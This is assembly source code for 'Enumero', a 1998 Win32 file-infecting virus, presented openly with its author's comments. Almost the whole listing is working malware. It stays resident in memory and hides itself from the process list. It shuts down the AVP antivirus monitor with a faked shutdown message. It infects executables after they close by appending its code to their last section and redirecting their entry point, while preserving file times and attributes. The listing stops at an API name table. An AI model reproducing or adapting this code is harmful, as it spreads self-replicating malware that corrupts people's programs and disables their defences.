
;
; Enumero, (c)1998 by Virogen[NOP]
; http://virogen.cjb.net
;
; This is a fairly simple virus I whipped up REAL fast outta the
; existing enumiacs source. The only real thing I wanted to accomplish 
; with this virus was full win32 support and demonstration of proper
; PE infection by appending at the end of the last object's virtual
; size, not physical size. 
;
; OS: Win32 (win95/98/NT)
; Hosts: PE (Parastic - append to last object at obj_rva+obj_vsize
;        No date/time change
;        No attribute change
;	 Correct checksum set in header.
;        Physical file size increase varies depending on file alignment
;         and previous padding on last object.
; Characteristics: Memory resident. Infects PEs when they terminate. Note
;                  that the PE must have created a window sometime in
;                  its execution, it doesn't matter if this window
;                  is visible or not. Process hidden from win95/98
;                  process list.
;		   
;
; greetz: lapse,jp,vecna,darkman, and everyone else
;

include mywin.inc

ID_OFF                            equ 0ch    ; offset of our marker in PE
physical_eip                      equ 400h   ; physical eip
host_physical_eip                 equ physical_eip+(offset host_entry-offset vstart)  ; physical eip of host entry set
VIRUS_SIZE                        equ 6656   ; size after vgalign
VIRTUAL_SIZE                      equ 6656

; max module/process names we can queue - keep in mind that each
; is allocated 256 bytes of memory
max_idx equ 300

.386
locals
jumps
.model flat,STDCALL
;
; our imported APIs for spawned virus - the spawned virus doesn't have to
; worry with manual importing nor delta offsets of course.
;
extrn ExitProcess:PROC
extrn EnumWindows:PROC
extrn SetPriorityClass:PROC
extrn GetCurrentProcess:PROC
extrn CloseHandle:PROC
extrn ReadFile:PROC
extrn WriteFile:PROC
extrn SetFilePointer:PROC
extrn GetModuleHandleA:PROC
extrn MapViewOfFile:PROC
extrn CreateFileMappingA:PROC
extrn UnmapViewOfFile:PROC
extrn SetEndOfFile:PROC
extrn SetFilePointer:PROC
extrn GetFileAttributesA:PROC
extrn SetFileAttributesA:PROC
extrn GetFileSize:PROC
extrn GetTickCount:PROC
extrn GetFileSize:PROC
extrn GetFileTime:PROC
extrn SetFileTime:PROC
extrn GetProcAddress:PROC
extrn CheckSumMappedFile:PROC
extrn PeekMessageA:PROC
extrn Sleep:PROC
extrn CopyFileA:PROC
extrn FindWindowA:PROC
extrn GetWindowThreadProcessId:PROC
extrn OpenProcess:PROC
extrn PostMessageA:PROC
extrn GetModuleFileNameA:PROC
extrn LoadLibraryA:PROC
extrn FreeLibrary:PROC
extrn IsBadReadPtr:PROC
	
org 0  
.data           
db 'þ [Enumero] by Virogen [NOP] þ'               ; it's i said the fly
.code
vstart:    
    call geteip                               ; find relative offset
geteip:
    mov 	ebp,[esp]                             ; grab it off stack
    mov 	eax,ebp                               ; used below
    sub 	ebp,offset geteip                     ; fix it up
    add 	esp,4                                 ; fix da stack

; first, let's find kernel base. If this is a parastic portion of virus
; executing, we'll need to obtain a few APIs in order to spawn the virus.
; Here we get a pointer to the kernel from the stack (a return address).
; Then we scan down until we find the kernel base. 
;
; We encapsulate this with an SEH handler, in case something goes bad wrong
; we simply immediatly jump to the host (if this is a parastic copy of the
; virus).
;    			    
       call 	set_seh                	   ; setup SEH frame    
;-- error handler    
       mov 	esp,[esp+8]                      
       pushad
       pushfd
       call 	geteip3
geteip3:    
       pop 	ebp
       sub 	ebp,offset geteip3
       jmp 	seh_exit  	
;-- end error handler
set_seh: 
       push 	dword ptr fs:[0]                ; save old exception ptr
       mov 	fs:[0],esp   		         ; set ptr to our exception handler    
       mov 	edx,[esp+8]                      ; determine OS
    
find_base_loop:
       cmp 	dword ptr [edx+0b4h],edx              ; if we're at base, then
       jz 	good_os                                ; offset 0b4h contains kernel
       dec 	edx                                   ; base
       jmp 	find_base_loop

good_os:
       mov 	[ebp+kernelbase],edx                   ; save kernel base

       pushad
       pushfd
;
; this is my API importer from lorez, imports APIs from the kernel32.dll
; export table in memory. Someday I will recode this in a more efficient 
; fashion, but I am too lazy today.
;
; a brief explanation of the organization of the export table would be
; useful here. Ok, basically there are three tables within the export
; table : API RVA Table (32bit), Name Pointer Table(32bit), and Ordinal
; Table (16bit). Ok, the ordinal number of an API is the entry number of
; the API in the RVA array. So, multiply the ordinal number by four and
; you've got an index into the API RVA Table. Probably you don't already
; have the ordinal number though, so you'll have to find it. To do this,
; you use the Name Pointer Table. This is an array of pointers to the
; asciiz name of each API. When you find the pointer of the API you're
; looking for by string compares, you take the index number of it and
; multiply it by 2 (because the ordinal table is 16bit). Index the result
; in the ordinal table, and you're all set.
;
;
       mov 	esi,edx
       add 	esi,[esi+3ch]                         ; relative ptr to PE header
       cmp 	word ptr [esi],'EP'                   ; make sure we're on right track
       jnz 	goto_host                             ; if not.. abort
       mov 	esi,[esi+120]                         ; get export table RVA
       add 	esi,edx                               ; relative to image base
       mov 	edi,[esi+36]                          ; get ordinal table RVA
       add 	edi,edx                               ; relative to image base
       mov 	[ebp+ordinaltbl],edi                  ; save it
       mov 	edi,[esi+32]                          ; get name ptr RVA
       add 	edi,edx                               ; is relative to image base  
       mov 	[ebp+nameptrtbl],edi                  ; save it
       mov 	ecx,[esi+24]                          ; get number of name ptrs
       mov 	esi,[esi+28]                          ; get address table RVA
       add 	esi,edx                               ; is relative to image base
       mov 	[ebp+adrtbl],esi                      ; save it

       xor 	edx,edx                               ; edx is our ordinal counter
					      ; edi=name ptr table
					      ; ecx=number of name ptrs
       lea 	esi,[ebp+APIs]                        ; -> API Name ptrs
       mov 	[ebp+ourAPIptr],esi                   ; save it
       lea 	eax,[ebp+API_Struct]                  ; our API address will go here
       mov 	[ebp+curAPIptr],eax                   ; save it
chk_next_API_name:
       mov 	esi,[ebp+ourAPIptr]                   ; get ptr to structure item
       mov 	ebx,[esi]                             ; load ptr to our API name
       add 	ebx,ebp                               ; add relative address
       mov 	esi,[edi]                             ; get API name RVA
       add 	esi,[ebp+kernelbase]                  ; relative to image base
compare_API_name:
       lodsb    
       cmp 	al,byte ptr [ebx]                     ; compare a byte of names
       jnz 	not_our_API                           ; it's not our API
       cmp 	al,0                                  ; end of string?
       jz 		is_our_API                             ; it's our API
       inc 	ebx
       jmp 	compare_API_name

not_our_API:
       inc 	edx                                   ; increment API counter
       cmp 	edx,ecx                               ; last entry of name ptr table?
       jz 	goto_host                              ; uhoh.. we didn't find one
					      ; of our APIs.. abort it all
       add 	edi,4                                 ; increment export name ptr idx
       mov 	esi,[ebp+ourAPIptr]                   ; restore our API name ptr struct
       jmp 	chk_next_API_name

is_our_API:

       mov	edi,[ebp+ordinaltbl]                  ; load oridinal table RVA
       push 	ecx
       push 	edx
       xchg 	edx,eax                              ; edx=API number
       add 	eax,eax                               ; *2 cuz ordinals are words
       add 	edi,eax                               ; add to ordinal table VA
       mov 	ax,[edi]                              ; get ordinal (word)
       xor 	edx,edx
       mov 	ecx,4
       mul 	ecx                                   ; *4 cuz address tbl is dd's
       mov 	edi,[ebp+adrtbl]                      ; load address table VA
       add 	edi,eax                               ; set idx to API
       mov 	eax,edi                                 
       sub 	eax,[ebp+kernelbase]                   ; get the VA of the entry
       mov 	[ebp+originalRVAptr],eax              ; save it for kernel infection
					      ; notice that our last API
					      ; in the array is the one we
					      ; hook
       mov 	eax,[edi]                             ; get API RVA
       mov 	[ebp+originalRVA],eax                 ; save it for kernel infection
       add 	eax,[ebp+kernelbase]                  ; is relative to image base
       mov 	edi,[ebp+curAPIptr]                   ; idx to storage stucture
       mov 	[edi],eax                             ; save VA of API
       add 	edi,4                                 ; increment index
       mov 	[ebp+curAPIptr],edi                   ; save    

       pop 	edx
       pop 	ecx

       mov 	edi,[ebp+nameptrtbl]                  ; reset export name ptr tableidx
       mov 	esi,[ebp+ourAPIptr]                   ; restore idx to our name ptrs
       add 	esi,4                                 ; increment idx API name ptr structure
       mov 	[ebp+ourAPIptr],esi                   ; save our new ptr to name ptr
       cmp 	dword ptr [esi],0                     ; end of our API structure?
       jz	found_all                              ; if so then we got 'em all
       mov 	edi,[ebp+nameptrtbl]                  ; reset idx to export name pt
       xor 	edx,edx                               ; reset API counter
       jmp 	chk_next_API_name    

;
; now we've imported all our needed APIs to spawn the virus and execute.
; First we check to see if this is spawned or parastic copy by checking
; delta offset.
;
found_all:	
       or 	ebp,ebp                                ; spawned file or 1st gen?
       jz	spawned_func
;
; if parastic copy of virus, then spawn virus and execute it.
;
	push 	275
	push 	64                                ; allocate memory for spawn
	call 	[ebp+GlobalAllocAPI]              ; path and filename
	or 	eax,eax                             
	jz 	goto_host

	xor 	ecx,ecx
	call 	GetVirusPathFile

	mov 	[ebp+spawnfile],eax                  ; eax->sysdir/spawnfilename buffer        
	push 	eax                                 ; save it fer later

	push 	eax                              
	call 	[ebp+DeleteFileAPI]                  ; attempt to delete 

;
; now we spawn a copy of the virus. If there is an error creating the
; spawn file, then that means it is probably shared and therefore already
; in memory.
;
	pop 	esi                                   ; esi->spawn filename
	call 	Create                               ; CreateFile
	cmp 	eax,-1                      ; if error, then we're already in mem
	jz 	dealloc_goto_host                    
	push 	eax                        ; save handle
	mov 	ecx,VIRUS_SIZE
	mov 	esi,ebp
	add 	esi,offset vstart-physical_eip
	call 	Write                      ; write our virus
	call 	[ebp+CloseFileAPI]         ; handle still on stack
	
	lea 	eax,[ebp+sinfo]             ; overwrite some other unused vars
	push 	eax                        
	call 	[ebp+GetStartupInfoAPI]    ; get startup info of process

	lea 	eax,[ebp+pinfo]             ; storage for process info
	push 	eax
	lea 	eax,[ebp+sinfo]             ; startup info
	push 	eax
	push 	0                        
	push 	0                        
	push 	67108928h                  ; CREATE_DEFAULT_ERROR_MODE|IDLE 
	push 	0
	push 	0
	push 	0
	push 	0
	mov 	esi,[ebp+spawnfile]        ; esi->spawn sysdir/file
	push 	esi
	call 	[ebp+CreateProcessAPI]    ; create our viral process

	mov 	eax,[ebp+hprocess]
	push 	eax
	call 	[ebp+CloseHandleAPI]      ; close handle of our process  

dealloc_goto_host:
	mov 	eax,[ebp+spawnfile]
	push 	eax
	call 	[ebp+GlobalFreeAPI]
goto_host:
seh_exit:   
   
   	or 	ebp,ebp                               ; if spanwed
   	jz 	_exit
   
;
; Here we calculate the image base, in case this executable was loaded at a base other
; than the one specified in the PE header.
;

   	call 	get_ib_displacement                     
get_ib_displacement:            
   	mov 	ebx,newep[ebp]          
   	add 	ebx,(offset get_ib_displacement-offset vstart)
   	pop 	eax                     
   	sub 	eax,ebx  	                ; eax=image base             
   	add 	host_entry[ebp],eax        	; add image base to host entry rva   
   
	popfd
	popad
 	pop dword ptr fs:[0]                   ; restore original SEH frame
   	pop edx                                ; fixup stack 

   	jmp [ebp+host_entry]                        ; jmp to host entry VA                                
host_entry dd offset vstart                    ; store host entry here
newep dd 0

; spawned virus code - we can throw away delta offsets now. This is
; the portion of the virus that stays resident.
;
spawned_func:
	popfd
   	popad
   	pop 	dword ptr fs:[0]                   ; restore original SEH frame
   	pop 	edx                                ; fixup stack 
	xor 	ebp,ebp                             ; no delta offset
;
; first call PeekMessage so that the hourglass icon isn't displayed until
; timeout
;      
	push 	0
	push 	1
	push 	0
	push 	0
	push 	offset msgstruct
        call 	PeekMessageA

;
; here we try to get the address of RegisterServiceProcess, which will
; allow us to register as a service process under win95/98, therefore
; hiding us from the ctrl-alt-del process list. This API not available
; under WinNT, so we import it manually to make sure that it exists, we
; don't need any ivalid ordinal numbers on spawned virus loadup.
;
; While we're at it, we'll also attempt to import the address of our
; GetWindowModuleFileNameA from USER32.DLL. If this API doesn't exist,
; which it is a fairly new API, then we just pass control to the host.
;
;
       push 	offset user32
       call 	GetModuleHandleA            ; get handle of user32.dll
       or 	eax,eax
       jz 	_exit                         ; it should have been loaded
       push 	offset GetWindowModuleFileName
       push 	eax
       call 	GetProcAddress
       or 	eax,eax                       ; if we don't have this API, then 
       jz 	_exit                         ; we must be in old NT or 95 crap
       mov 	GetWindowModuleFileNameA,eax
       push 	offset kernel32
       call 	GetModuleHandleA
       or 	eax,eax
       jz 	_exit                         ; something bad wrong if this
       push 	offset RegisterService
       push 	eax
       call 	GetProcAddress              ; get rsp address
       or 	eax,eax                       
       jz 	isNT                          ; if not found, then NT system
       push 	1                           ; 1=register process
       push 	0                           ; null=current process
       call 	eax                         ; RegisterServiceProcess
       jmp 	is9598
;
; Under WinNT we'll make use of PSAPI.DLL functionz to retrieve module filenames.
; We'll grab the address of GetModuleFileNameEx and EnumProcessModules
; 

isNT:              	
       push 	offset psapi
       call 	LoadLibraryA
       or 	eax,eax
       jz 	is9598
       mov 	phandle,eax
       push 	offset EnumPModules
       push 	eax
       call 	GetProcAddress
       mov 	EnumProcessModules,eax
       or 	eax,eax
       jz 	unload_psapi       
       push 	offset GetMFileName
       push 	phandle
       call 	GetProcAddress
       mov 	GetModuleFileNameEx,eax
       or 	eax,eax
       jz 	unload_psapi       
       jmp 	is9598
unload_psapi:       
       push 	phandle
       call 	FreeLibrary
is9598:
;
; get rid of AVP Monitor by simulating a system shutdown, sending WM_ENDSESSION to
; its window
;
;
       push 	offset avp_wndname          ; AVP window name
       push 	0                           ; class name
       call 	FindWindowA                 ; Find AVP
       or 	eax,eax                       ; get handle?
       jz 	no_avp                        ; if not, then abort

       push 	0				; no lparam
       push 	0				; or wparam
       push 	WM_ENDSESSION		; WM_ENDSESSION generated at system shutdown
       push 	eax				; handle to window
       call 	PostMessageA		; Post the message

no_avp:
;
; allocate memory for, and load our virus for later infection
;
       push 	280
       push 	64
       call 	[GlobalAllocAPI]	; allocate memory for del buf
       or 	eax,eax
       jz 	_exit
       mov 	del_buf,eax
       push 	VIRUS_SIZE
       push 	64
       call 	[GlobalAllocAPI]
       or 	eax,eax
       jz 	_exit
       mov 	virus_mem,eax
       xor 	ecx,ecx                      ; return exe filename
       call 	GetVirusPathFile
       add 	eax,280
       inc 	ecx                          ; ecx!=0 get temp filename
       call 	GetVirusPathFile
       push 	eax                         ; save for below
       push 	0
       push 	eax
       sub 	eax,280
       push 	eax
       call 	CopyFileA
       pop 	esi                          ; esi->tmp filename
       call 	OpenRead
       cmp 	eax,-1
       jz 	dealloc_exit
       mov 	esi,virus_mem
       mov 	ecx,VIRUS_SIZE
       push 	eax                         ; save handle for close
       call 	Read
       cmp 	bytesread,VIRUS_SIZE
       jnz 	dealloc_exit
       call 	CloseHandle                 ; handle still on stack
       mov 	eax,del_buf
       inc 	ecx                          ; retrieve temp filename
       call 	GetVirusPathFile            ; get temp filename again
       push 	eax
       Call 	[DeleteFileAPI]             ; delete temp file
       jmp 	continue_spawned
dealloc_exit:
       push 	del_buf
       call 	[GlobalFreeAPI]
       push	virus_mem
       call 	[GlobalFreeAPI]             ; handle to mem still on stack      
       jmp 	_exit     
;
; now we need to allocate memory for our array
;
continue_spawned:
       push 	256*max_idx+1
       push 	64                          ; GPTR - fixed, zero init
       call 	[GlobalAllocAPI]            ; allocate memory for our array
       or 	eax,eax                       ; error allocating? exit
       jz 	dealloc_exit
       mov 	pnames,eax
       push 	1000h
       push 	64                           ; allocate memory for modules enumeration
       call 	[ebp+GlobalAllocAPI]         ;       
       or 	eax,eax
       jz 	dealloc_exit
       mov 	mod_array,eax
       
       call 	GetCurrentProcess           ; get current process handle
       push 	64                          ; idle priority class  
       push 	eax                         ; handle of current process
       call 	SetPriorityClass            ; set priority to idle

       mov 	testnums,0                   ; enumerate and load
       call 	InstallEnum                 ; first enumeration
;
; This is our memory resident loop. What this does is every 1 second
; check the number of windows open by re-enumerating them. If this number
; differs from the last # of open windows, then we go and try to infect
; all the queued processes, in hopes that one has closed and is suitable
; for infection. We try to infect the queued processes about 10 times with
; a quarter second delay between each, or until we at least can open one of
; the files, this is just in case the window was closed but we still need
; to give the process time to terminate.
;
main_loop:
       push 	500                         ; 1/2 second sleep 
       call 	Sleep                       ; suspend process for 1/2 second

       mov 	testnums,1                   ; just check number of windows
       call 	InstallEnum                 ; get number of windows
       mov 	eax,totalwnd                 ; get total windows from last en&l
       cmp 	testednums,eax               
       jz 	main_loop                     ; if equal keep enumerating

       mov 	icnt,0                       ; we want to keep trying to infect
do_i:
       call 	Infect                      ; infect if different # of windows open
       cmp 	re_enum,0                    
       jnz 	over_i                       ; if infected a file, then abort
       push 	250                         ; 1/4 second 
       call 	Sleep                       ; suspend process for 1/4 second
       inc 	icnt                         ; increment counter
       cmp 	icnt,10                      ; we'll try 10 times
       jnz 	do_i                         
over_i:
       mov 	testnums,0                   ; enumerate and load windows
       call 	InstallEnum                 
       jmp 	main_loop                    ; we'll want something else here..
					; may eat up too much cpu time
					; some waitforsingleobject variation
_exit:
       push 	0
       call 	ExitProcess
;
; This procedure enumerates the windows using EnumWindows. See
; EnumWindowsProcedure below, which is called for each window found.
;
InstallEnum       proc
       cmp 	testnums,1
       jz 	jdoit
       mov 	totalwnd,0                  
       mov 	totalexe,0
       mov 	eax,pnames
       mov 	curpos,eax
jdoit:
       mov 	testednums,0
       push 	9090h
       push 	offset EnumWindowsProc             
       call 	EnumWindows                 ; set up window enumeration
       ret
		
InstallEnum       endp

;
; EnumWindowsProc - this procedure is called for every window found.
; 
;
EnumWindowsProc          proc uses ebx edi esi, hwnd:DWORD, lparam:DWORD		
	cmp 	testnums,1         ; only testing num of windows?
	jz 	enum_only           ; if so just increment counter
	cmp 	totalexe,max_idx   ; filled our array?
	jge 	not_exe            ; if so just increment counter
        mov 	eax,GetWindowModuleFileNameA
        or 	eax,eax
        jz 	is_old_win
        push 	255               ; maximum size of path&filename + null
        push 	curpos            ; pointer to current member of array
        push 	hwnd              ; handle of window
        call 	eax	       ; get associated module filename	
	or 	eax,eax             ; error - must be NT
	jnz 	got_fname_ok		
is_old_win:
; this is NT specific code
; If we couldn't 
	cmp 	EnumProcessModules,0	; make sure we got api va
	jz 	bad_abort
	cmp 	GetModuleFileNameEx,0	; make sure we got api va
	jz 	bad_abort
	push 	offset pid		
	push 	hwnd
	call 	GetWindowThreadProcessId ; get process id 
	push 	pid
	push 	0
	push 	PROCESS_ALL_ACCESS
	call 	OpenProcess		 ; open da process
	mov 	phandle,eax
	or 	eax,eax
	jz 	bad_abort				
	push 	offset bytesread
	push 	1000h
	push 	mod_array
	push 	phandle
	call 	[EnumProcessModules]	; enumerate process modules
	mov 	esi,mod_array
getmodloop:			
	lodsd		
	or 	eax,eax
	jz 	abortmodloop
	push 	255               ; maximum size of path&filename + null
	push 	curpos            ; pointer to current member of array
	push 	eax
	push 	phandle
        call 	[GetModuleFileNameEx] ; get associated module filename
        call 	testexe
        jc 	getmodloop	   ; if not exe then keep scanning
abortmodloop:
	push 	eax
	push 	phandle
        call 	CloseHandle 
        pop 	eax        
got_fname_ok:       
	call 	testexe
	jc 	not_exe            ; if not, then don't add to pointer
	add 	curpos,256         ; increment pointer to next member of array
	inc 	totalexe           ; increment total #s of EXEs found        
not_exe:     
	inc 	totalwnd           ; increment total number of window
bad_abort:
	ret
enum_only:
	inc 	testednums
	ret
EnumWindowsProc endp

;
; here we search the saved process filenames and try to infect each one
;
Infect proc				
	mov 	esi,pnames                  ; pointer to allocated array
	sub 	esi,256                     ; member -1, will make 0 in loop
	mov 	curidx,-1                   ; will increment to 0
	mov 	re_enum,0                   ; if we infected flag
 iloop:
	inc 	curidx                      ; increment current member of array
	add 	esi,256                     ; increment index into array
	mov 	eax,totalexe                ; get total EXEs we found in enumer
	cmp 	curidx,eax                  ; we exceeded that amount?
	jg 	abloop                       ; if so we're done
	push 	esi                        ; esi->array member (filename); save
	call 	OpenFile                   ; try and open it
	pop 	esi                         ; restore ptr to filename
	cmp 	eax,-1                      ; error opening file?
	jz 	iloop                        ; if so skip to next member of array
	mov 	fnameptr,esi                ; else save the filename pointer
	push 	eax                        ; eax=handle of file
	call 	CloseHandle                ; close the file
	push 	esi
	call 	InfectFile                ; infect the file
	pop 	esi
	mov 	re_enum,1                   ; set successful infectin flag
	jmp 	iloop                       ; continue trying to infect
abloop:
	ret
Infect endp

testexe proc		
	or 	eax,eax
	jz 	return_stc 
	mov 	ecx,eax            ; ecx=size of path&filename of module
	add 	ecx,curpos         ; set up pointer to end of path&filename
	sub 	ecx,3              ; extension starts here
	cmp 	word ptr [ecx],'XE' ; make sure it's EXE
	jz 	return_clc
	cmp 	word ptr [ecx],'xe'
	jz 	return_clc	
return_stc:
	stc 
	ret
return_clc:	
	clc 
	ret	
testexe endp	

; return pointer to virus path and filename
; entry: eax->buffer
;        ecx=0 if exe file, 1 if tmp file
; return: eax->buffer
GetVirusPathFile proc

	push 	eax
	push 	ecx
	push 	eax

	push 	260                                  ; max path size
	push 	eax                                  ; ptr
	call 	[ebp+GetSysDirAPI]                   ; get sys directory

	pop 	edi                                   ; edi->sys directory
	add 	edi,eax                               ; edi->end of dir
	pop 	ecx
	or 	ecx,ecx
	jnz 	tmpname
	lea 	esi,[ebp+virusname]                   ; esi->spawn filename
	jmp 	append
tmpname:
	lea 	esi,[ebp+tempname]
append:
	call 	copy_str                             ; append to sys dir
	pop 	eax
	ret

GetVirusPathFile endp


OpenRead:
      	mov 	ecx,3
      	mov 	ebx,80000000h
      	jmp 	or
Create:
      	mov 	ecx,1
      	jmp 	of
OpenFile proc
	mov 	ecx,3
of:
      	mov 	ebx,0c0000000h
or:
      	push 	0
      	push 	20h                          ; attribute normal
      	push 	ecx                          ; 3=open existing file
      	push 	0
      	push 	0
      	push 	ebx                          ; permissions
      	push 	esi
      	call 	[ebp+CreateFileAPI]
      	ret
OpenFile endp

Read proc
      	push 	0
      	push 	offset bytesread
      	push 	ecx
      	push 	esi
      	push 	eax
      	call 	ReadFile
      	ret
Read endp

Write proc
      	push 	0
      	lea 	ebx,[ebp+bytesread]
      	push	ebx
      	push 	ecx
      	push 	esi
      	push 	eax
      	call 	[ebp+WriteFileAPI]
      	ret
Write endp


;-----------------------------------------------
; infect file - call with fnameptr set
;
; As you can see, we append to the last object at RVA+virtual size
; and then set physical size to file_align(obj_virtual_size+
; virus_physical_size). In this way, we take advantage of any padded
; space in the last object therefore decreasing the physical size
; increase of the host.
;
; It is my contention, that since the virtual size usually represents
; the true unaligned physical size, appending should always occur
; at the end of the virtual size and then the physical size should
; be aligned to the new virtual size. 
;
;
InfectFile proc
    
	mov 	eax,fnameptr
    	push 	eax
    	call 	GetFileAttributesA                  ; get file attributes
    	mov 	oldattrib,eax

    	cmp 	eax,-1                               ; if error then maybe shared
    	jnz 	not_shared
    	ret                                      ; can't infect it    

not_shared:
    	push 	20h                                 ; +A
    	mov 	eax,fnameptr
    	push 	eax
    	call 	SetFileAttributesA                  ; clear 'da attribs
	
    	mov 	esi,fnameptr
    	call 	OpenFile
    	cmp 	eax,-1
    	jnz 	open_ok
    	ret         
open_ok:    
    	mov 	handle,eax

	push 	offset creation
    	push 	offset lastaccess
    	push 	offset lastwrite
    	push 	eax
    	call 	GetFileTime                       ; grab the file time

	xor 	ecx,ecx                               ; only map size of file
    	call 	create_mapping                       ; create file mapping 
    	jc 	abort_infect
					      ; eax->mapped file
    	cmp 	word ptr [eax],'ZM'                   ; is EXE?
    	jnz 	abort_infect

    	call 	GetPEHeader                          ; load esi->PE Header

	push 	2                                                                   
    	push 	esi                                    ; test ptr for read acces 
    	call 	IsBadReadPtr                           ; was ptr any good?       
    	or 	eax,eax                                                             
    	jnz 	abort_infect                                                       

	cmp 	word ptr [esi],'EP'                    ; PE?
    	jnz 	abort_infect

	cmp 	dword ptr [esi+ID_OFF],0               ; any value here?
    	jnz 	abort_infect                           ; if yes, infected

	call 	unmap                                 ; unmap file

    	mov 	ecx,VIRUS_SIZE+1000h                   ; add max virus size to map size
    	call 	create_mapping                        ; map file again
    	jc 	abort_infect

	call 	GetPEHeader                           ; load esi -> pe header

    	call 	GetTickCount                          ; get tick count
    	mov 	dword ptr [esi+ID_OFF],eax             ; save as infect flag

	xor 	eax,eax
    	mov 	ax, word ptr [esi+NtHeaderSize]        ; get header size
    	add 	eax,18h                                ; object table is here     

    	mov 	edi,esi
    	add 	edi,eax                                 ; edi->object table    
    	xor 	eax,eax                        
    	mov 	ax,[esi+numObj]                         ; get number of objects
    	dec 	eax                                     ; we want last object
    	mov 	ecx,40                                  ; each object 40 bytes
    	xor 	edx,edx
    	mul 	ecx                                     ; numObj-1*40=last object     
    	add 	edi,eax                                 ; edi->last obj

    	mov 	eax,[edi+objpoff]                       ; get last object physical off
    	mov 	lastobjimageoff,eax                     ; save it

    	mov 	ecx,[edi+objpsize]                      ; get physical size of object                
    	mov 	eax,[edi+objvsize]                      ; get object virtual size        	
    	push 	eax					; save virtual size
    	push    ecx					; save original p size
    	mov 	originalvsize,eax                       ; save it 4 later
    	add 	eax,VIRTUAL_SIZE                        ; add our virtual size    
    	mov 	dword ptr [edi+objvsize],eax            ; save new virtual size    
    	mov	ecx,[esi+filealign]			; physical size=filealign(vsize)
    	call 	align_fix				; align new vsize to be psize
    	mov 	[edi+objpsize],eax			; save new physical size
    	mov     newpsize,eax				; store it for exe size calc
    	push 	eax					

    	mov 	ecx,dword ptr [esi+objalign]            ; get object alignment
    	mov 	eax,dword ptr [edi+objvsize]            ; add virtual size
    	add 	eax,dword ptr [edi+objrva]              ; +last object rva
    	call 	align_fix                               ; set on obj alignment
    	mov 	dword ptr [esi+imagesize],eax           ; save new imagesize  

    	mov 	[edi+objflags],0E0000060h               ; set object flags r/w/x
    	
    	pop 	ecx					; restore new phsyical size
    	pop	eax					; original psize
    	sub 	ecx,eax
    	mov 	diffpsize,ecx
    
    	pop 	eax                                     ; restore orginal virtual size
    	add 	eax,[edi+objrva]                        ; add last object's RVA 
							; eax now RVA of virus code
    	add 	eax,physical_eip                        ; add physical eip:    
    	mov 	ebx,[esi+entrypointRVA]                 ; get original entry        
    	mov 	[esi+entrypointRVA],eax                 ; put our RVA as entry
    
    	mov 	ecx,[ebp+virus_mem]
    	add 	ecx,host_physical_eip
    	mov 	[ecx],ebx                         	; save host e RVA
    	add 	ecx,4
    	mov 	[ecx],eax			    	; save virus e RVA
;
    	push 	esi
            
    	mov 	edi,map_ptr
    	add 	edi,originalvsize                  	; restore original virtual size
    	add 	edi,lastobjimageoff                	; add object physical offset
    							; edi->physical end of object
    	mov 	esi,virus_mem                      	; esi->virus
    	mov 	ecx,VIRUS_SIZE    	
    	rep 	movsb				        ; copy virus to host    	    	
    	
    	pop 	esi
    	mov 	ecx,lastobjimageoff
    	add 	ecx,newpsize
    	mov 	fsize,ecx                               ; store new filesize
	push 	ecx                                     ; ecx=real file size

    	call 	unmap                                   ; unmap file

    	pop 	ecx
    	push 	FILE_BEGIN                              ; from file begin
    	push 	0                                       ; distance high
    	push 	ecx                                     ; distance low
    	push 	handle
    	call	SetFilePointer                      	; move file pointer to
						 	; real EOF
    	push 	handle
    	call 	SetEndOfFile		                ; set end of file
;
; now we need to calculate checksum. We need to remap the file to get it
; right after file size change. I might be wrong about this, there could
; have been a bug in my code, but it seems resonable.
;
    	xor 	ecx,ecx
    	call 	create_mapping
    	jc 	unmapped
    	mov 	esi,[eax+3ch]                            
    	add 	esi,eax                                  ; esi->pe header
    	lea 	eax,[esi+checksum]
    	push 	eax                     	         ; destination of checksum in hdr
    	push 	offset oldchksum
    	push 	fsize                           	 ; new file size
    	mov 	eax,map_ptr
    	push 	eax
    	call 	CheckSumMappedFile
    	call 	unmap

	jmp 	unmapped                                

abort_infect:
    	call 	unmap         			          ;unmap if aborted infection
unmapped:

    	push 	offset creation
    	push 	offset lastaccess
    	push 	offset lastwrite
    	push 	handle
    	call 	SetFileTime              		; restore orginal file time

    	push 	handle
    	call 	CloseHandle

    	mov 	eax,oldattrib  		                ; get original attribs 
    	push 	eax
    	mov 	eax,fnameptr
    	push 	eax                    
    	call 	SetFileAttributesA	                 ; restore the original attributes

	ret                                 
InfectFile endp

GetPEHeader proc
    	mov 	esi,[eax+3Ch]                        ; where PE hdr pointer is
    	add 	esi,eax    
    	ret
GetPEHeader endp

; create_mapping - create file mapping of [handle]
; entry: ecx=mapping size
;
create_mapping proc
    	push 	ecx                    ; save mapping size

    	push 	0                      ; high fsize storage, not needed
    	push 	handle                 ; file handle
    	call 	GetFileSize
    	call 	test_error
    	jc 	create_abort
    	mov 	fsize,eax

    	pop 	ecx                     ; restore map size

    	push 	0              ; no map name
    	add 	eax,ecx
    	push 	eax            ; low size+vs  
    	push 	0              ; high size
    	push 	PAGE_READWRITE ; read&write
    	push 	0     
    	push 	handle
    	call 	CreateFileMappingA
    	call 	test_error
    	jc 	create_abort
    	mov 	maphandle,eax
	
    	push 	0               ; # of bytes, 0= map entire file
    	push 	0               ; file offset low
    	push 	0               ; file offset high
    	push 	FILE_MAP_WRITE  ; access flags - read&write
    	push 	eax             ; handle
    	call 	MapViewOfFile
    	call 	test_error
    	jc 	create_abort
    	mov 	map_ptr,eax
	    
create_abort:
    	ret
create_mapping endp


; test_error - test API for an error return
;  entry: eax=API return
;  returns: carry if error
;
test_error proc
   	cmp 	eax,-1
   	jz 	api_err
   	or 	eax,eax
   	jz 	api_err
   	clc
   	ret
api_err:
   	stc
   	ret
test_error endp

;--------------------------------------------------------------
; unmap file - Unmap view of file
; 
unmap:
  
    	push 	map_ptr
    	call 	UnmapViewOfFile
    	push 	maphandle
    	call 	CloseHandle
    	ret

;--------------------------------------------------------------
; sets eax on alignment of ecx
;
align_fix:
     	xor 	edx,edx
     	div 	ecx                               ; /alignment
     	or 	edx,edx				   ; check for remainder
     	jz 	no_inc
     	inc	eax                               ; next alignment
no_inc:     
	mul 	ecx                               ; *alignment                             
     	ret

;-------------------------------------------------------------
; copy string
; pass edi->destination esi->source
; we could use lstrcat for this purpose, but oh well
; 

copy_str:
    	mov 	ecx,0FFh                              ; no bigger than 256
copystr:
    	lodsb
    	stosb
    	cmp 	al,0
    	jz 	copystrdone
    	loop 	copystr
copystrdone:
    	ret

APIs:                                  ; structure of ptrs to our API names
dd offset CreateFile
dd offset CloseHandleS
dd offset WriteFileS
dd offset CloseFile
dd offset GetSysDir
dd offset DeleteFile
dd offset CreateProc
dd offset GetStartUp
